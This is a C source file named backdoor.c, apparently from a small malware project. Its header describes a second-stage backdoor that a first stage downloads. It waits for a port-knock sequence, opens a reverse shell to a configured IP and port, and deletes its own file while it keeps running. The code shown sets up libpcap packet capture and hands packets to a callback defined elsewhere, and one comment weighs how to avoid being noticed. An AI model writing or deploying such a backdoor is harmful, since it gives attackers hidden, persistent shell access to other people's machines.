/*  File: backdoor.c
*   Author: Nunyabeeswax
*   Date: 6/07/2021
*   Description:
*				- 2nd stage backdoor downloaded by validator 1st stage.
*				- Listens for ports specified in MULTI_KNOCK.
*				- When they're knocked in order, it starts shell connection using a socket stream.
*				- Listen at REV_SHELL_IP:REV_SHELL_PORT for the reverse shell.
*				- If daemonized, deletes itself from directory but still listens and returns connection!
*/


#include <stdlib.h>
#include <pcap.h>
#include <netinet/in.h>
#include "functionality.h"


int main(int argc, char **argv){
	char *dev = NULL;					/* capture device name */
	char errbuf[PCAP_ERRBUF_SIZE];		/* error buffer */
	pcap_t *handle;						/* packet capture handle */

	char filter_exp[] = "tcp";			/* filter expression [3]. Added efficiency: Only listen on specified ports. or would that be noticeable*/
	struct bpf_program fp;				/* compiled filter program (expression) */
	bpf_u_int32 mask;					/* subnet mask */
	bpf_u_int32 net;					/* ip */
	int num_packets = -1;				/* number of packets to capture... INF if -1 */

	#ifdef INTERFACE
	/* get capture device*/
	dev = INTERFACE;
	#endif

	#ifdef MULTI_KNOCK
		if(NUM_PORTS > 7){
			#ifdef DEBUG
				fprintf(stderr, "Too many arguments. 7 ports Max.\n");
			#endif
			exit(EXIT_FAILURE);
		}
	#endif

	/* get network number and mask associated with capture device */
	if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
		#ifdef DEBUG
			fprintf(stderr, "Couldn't get netmask for device %s: %s\n",
		    	dev, errbuf);
		#endif
		net = 0;
		mask = 0;
	}

	#ifdef DEBUG
		/* print capture info */
		printf("Device: %s\n", dev);
		printf("Number of packets: %d\n", num_packets);
		printf("Filter expression: %s\n", filter_exp);
	#endif

	/* open capture device */
	handle = pcap_open_live(dev, SNAP_LEN, 1, 1000, errbuf);
	if (handle == NULL) {
		#ifdef DEBUG
			fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
		#endif
		exit(EXIT_FAILURE);
	}

	/* make sure we're capturing on an Ethernet device [2] */
	if (pcap_datalink(handle) != DLT_EN10MB) {
		#ifdef DEBUG
			fprintf(stderr, "%s is not an Ethernet\n", dev);
		#endif
		exit(EXIT_FAILURE);
	}

	/* compile the filter expression */
	if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
		#ifdef DEBUG
			fprintf(stderr, "Couldn't parse filter %s: %s\n",
		    	filter_exp, pcap_geterr(handle));
		#endif
		exit(EXIT_FAILURE);
	}

	/* apply the compiled filter */
	if (pcap_setfilter(handle, &fp) == -1) {
		#ifdef DEBUG
			fprintf(stderr, "Couldn't install filter %s: %s\n",
		    	filter_exp, pcap_geterr(handle));
		#endif
		exit(EXIT_FAILURE);
	}

	
	/* now we can set our callback function. INFINITE Loop if num_pckt=-1*/
	pcap_loop(handle, num_packets, got_packet, NULL);

	// should never reach this part as both child & parent exit from got_packet()

	pcap_freecode(&fp);
	pcap_close(handle);

	return 0;
}

